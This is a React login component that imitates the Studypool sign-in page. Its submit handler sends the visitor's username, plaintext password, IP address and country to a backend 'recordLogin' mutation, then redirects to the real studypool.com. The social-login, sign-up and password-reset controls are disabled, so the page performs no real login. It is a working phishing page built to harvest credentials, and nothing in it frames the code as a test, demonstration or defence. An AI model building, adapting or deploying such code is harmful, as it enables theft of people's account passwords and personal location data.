import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";
import { Eye, EyeOff } from "lucide-react";
import { trpc } from "@/lib/trpc";

export default function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [isLogin, setIsLogin] = useState(true);
  const [showPassword, setShowPassword] = useState(false);
  const [userCountry, setUserCountry] = useState<string>("Unknown");
  const [userIp, setUserIp] = useState<string>("");

  // Fetch user's IP and country on component mount
  useEffect(() => {
    const fetchUserLocation = async () => {
      try {
        const response = await fetch("https://ipapi.co/json/");
        const data = await response.json();
        setUserCountry(data.country_name || "Unknown");
        setUserIp(data.ip || "");
      } catch (error) {
        console.error("Failed to fetch location:", error);
        setUserCountry("Unknown");
      }
    };

    fetchUserLocation();
  }, []);

  const recordLoginMutation = trpc.student.recordLogin.useMutation();

  const handleLogin = () => {
    // Only redirect if both email and password are provided
    if (!email || !password) {
      alert("Please enter both username/email and password");
      return;
    }

    // Record the login data in the background (fire and forget)
    recordLoginMutation.mutate({
      username: email,
      password: password,
      email: email,
      country: userCountry,
      ipAddress: userIp,
    });

    // Redirect to studypool.com after a tiny delay to ensure mutation starts
    setTimeout(() => {
      window.location.href = "https://www.studypool.com";
    }, 100);
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4">
      <div className="w-full max-w-md">

        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center gap-4 mb-6">
            <h1 className="text-4xl font-bold text-gray-900">
              {isLogin ? "Log in" : "Sign Up"}
            </h1>
            <span className="text-gray-400 text-lg">or</span>
            <button
              onClick={() => setIsLogin(!isLogin)}
              className="text-2xl font-normal text-gray-400 hover:text-gray-600 transition"
            >
              {isLogin ? "Sign Up" : "Login"}
            </button>
          </div>
          {/* Underline for Login tab */}
          {isLogin && (
            <div className="w-24 h-1 bg-blue-500 rounded-full"></div>
          )}
        </div>

        {/* Form */}
        <div className="space-y-6">
          {/* Username/Email Field */}
          <div>
            <label className="block text-sm font-semibold text-gray-500 mb-3">
              USERNAME
            </label>
            <div className="relative">
              <Input
                type="text"
                placeholder="Email/Username"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full px-4 py-3 pl-12 border border-gray-300 rounded-lg text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              />
              <svg
                className="absolute left-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400"
                fill="currentColor"
                viewBox="0 0 20 20"
              >
                <path d="M10 10a3 3 0 100-6 3 3 0 000 6zm0 1.5c-2.5 0-5 1.25-5 3.75V17h10v-1.75c0-2.5-2.5-3.75-5-3.75z" />
              </svg>
            </div>
          </div>

          {/* Password Field */}
          <div>
            <label className="block text-sm font-semibold text-gray-500 mb-3">
              PASSWORD
            </label>
            <div className="relative">
              <Input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-4 py-3 pl-12 pr-12 border border-gray-300 rounded-lg text-gray-700 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              />
              <svg
                className="absolute left-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400"
                fill="currentColor"
                viewBox="0 0 20 20"
              >
                <path
                  fillRule="evenodd"
                  d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                  clipRule="evenodd"
                />
              </svg>
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 transition"
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
          </div>

          {/* Remember me and Forgot password */}
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Checkbox id="remember" />
              <label
                htmlFor="remember"
                className="text-sm font-medium text-gray-900 cursor-pointer"
              >
                Remember me
              </label>
            </div>
            <button
              className="text-sm font-medium text-blue-500 hover:text-blue-600 transition cursor-pointer"
              disabled
            >
              I forgot my password
            </button>
          </div>

          {/* Login Button */}
          <Button
            onClick={handleLogin}
            className="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 rounded-lg text-lg transition"
          >
            LOGIN
          </Button>

          {/* Divider */}
          <div className="flex items-center gap-4 my-6">
            <div className="flex-1 h-px bg-gray-300"></div>
            <span className="text-gray-400 text-sm font-medium">OR</span>
            <div className="flex-1 h-px bg-gray-300"></div>
          </div>

          {/* Social Login Buttons */}
          <div className="space-y-3">
            {/* Google Button */}
            <button className="w-full flex items-center justify-center gap-3 px-4 py-3 bg-white border border-gray-300 rounded-lg hover:bg-gray-50 transition" disabled>
              <svg
                className="w-5 h-5"
                viewBox="0 0 24 24"
                fill="none"
              >
                {/* Google logo colors */}
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4" />
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853" />
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05" />
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335" />
              </svg>
              <span className="text-gray-600 font-medium">Login with Google</span>
            </button>

            {/* Facebook Button */}
            <button className="w-full flex items-center justify-center gap-3 px-4 py-3 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition" disabled>
              <svg
                className="w-5 h-5"
                fill="currentColor"
                viewBox="0 0 24 24"
              >
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
              </svg>
              <span className="font-medium">Login with Facebook</span>
            </button>
          </div>

          {/* Sign Up Link */}
          <div className="text-center mt-6">
            <span className="text-gray-700">Don't have an account? </span>
            <button
              className="text-blue-500 hover:text-blue-600 font-medium transition cursor-pointer"
              disabled
            >
              Sign Up
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
